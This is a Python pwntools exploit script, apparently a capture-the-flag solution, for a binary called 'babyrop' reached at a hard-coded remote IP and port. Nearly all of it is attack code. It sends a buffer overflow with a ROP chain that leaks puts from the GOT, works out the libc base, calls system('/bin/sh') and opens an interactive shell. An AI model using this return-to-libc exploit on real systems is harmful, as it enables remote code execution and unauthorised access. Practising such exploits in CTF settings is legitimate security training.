#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './babyrop'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('47.112.137.238', 13337)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x080487FF
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)
# pause()

sh.sendline('\0' + '\xff' * 18)

sh.recvuntil('Correct\n')

sh.send('a' * 231 + p32(0x804b000 - 0x800) + p32(elf.plt['puts']) + p32(0x08048519) + p32(elf.got['puts']) + p32(elf.plt['read']) + p32(0x08048608) + p32(0) + p32(0x804b000 - 0x800) + p32(0x200))

result = sh.recvuntil('\n')[:-1]
libc_addr = u32(result) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

sh.send(p32(0) + p32(libc_addr + libc.symbols['system']) + p32(libc_addr + libc.symbols['exit']) + p32(libc_addr + libc.search('/bin/sh').next()))

sh.interactive()
clear()
